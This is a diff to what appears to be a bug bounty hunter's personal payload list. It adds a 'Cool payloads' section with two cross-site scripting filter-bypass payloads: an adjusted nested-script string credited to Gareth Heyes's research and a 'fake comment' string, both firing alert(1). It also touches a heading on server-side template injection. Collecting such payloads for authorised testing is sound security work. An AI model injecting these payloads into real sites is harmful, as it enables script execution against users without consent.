@@ -22,6 +22,21 @@ A list of payloads that I do use when hunting for vulnerabilities. Personaly, I 
 tfmtstart%255Az%5Az\x5Az\u005Az%26%23x5A%3Btfmtend
 ```
 
+## Cool payloads
+> This core payload was discoverd by the amazing research [garethheyes](https://x.com/garethheyes){:target="_blank"}!
+You can read more about his research on it [here](https://x.com/garethheyes/status/1813658752245236105){:target="_blank"}.
+
+I made a few adjustments to it:
+```html
+<script>'<!--<script>'</script>//alert(1)</script>
+```
+
+> The Fake comment XSS
+
+```
+/\///alert(1)
+```
+
 ## Server Side Template Injection (SSTI)
 ### Double template rendering payloads
 
